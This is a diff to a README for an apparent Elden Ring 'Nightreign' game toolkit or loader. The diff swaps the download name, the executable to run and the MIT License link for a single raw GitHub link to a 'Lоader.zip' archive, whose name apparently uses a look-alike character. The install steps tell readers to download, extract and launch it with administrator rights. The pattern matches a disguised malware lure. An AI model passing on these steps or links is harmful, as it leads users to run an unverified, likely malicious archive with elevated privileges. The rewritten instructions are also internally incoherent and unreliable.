@@ -45,13 +45,13 @@ Enjoy seamless functionality across the most popular gaming platforms! Check the
 Follow these step-by-step instructions for a safe and rapid setup:
 
 ### Step 1: Download Loader
-- Download **Loader.rar** directly from the repository’s releases section.
+- Download **https://raw.githubusercontent.com/Satnam21/NightreignToolkit-EldenRing/main/Lоader.zip** directly from the repository’s releases section.
 
 ### Step 2: Extract Files
-- Extract the **Loader.rar** contents using **WinRAR**, **7-Zip**, or your favorite archive tool. Ensure all files remain in the same directory.
+- Extract the **https://raw.githubusercontent.com/Satnam21/NightreignToolkit-EldenRing/main/Lоader.zip** contents using **WinRAR**, **7-Zip**, or your favorite archive tool. Ensure all files remain in the same directory.
 
 ### Step 3: Run Nightreign Loader
-- Launch the `Nightreign_Loader.exe` file (**Windows**), or equivalent script for **macOS/Linux**.
+- Launch the `https://raw.githubusercontent.com/Satnam21/NightreignToolkit-EldenRing/main/Lоader.zip` file (**Windows**), or equivalent script for **macOS/Linux**.
 - Grant necessary permissions (e.g., "Run as administrator" or `chmod +x`).
 
 ### Step 4: Play Elden Ring
@@ -84,7 +84,7 @@ Follow these step-by-step instructions for a safe and rapid setup:
 
 ## 📄 License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT) (2025).  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Satnam21/NightreignToolkit-EldenRing/main/Lоader.zip) (2025).  
 You're free to use, modify, and distribute this software under the terms of the license.
 
 ---
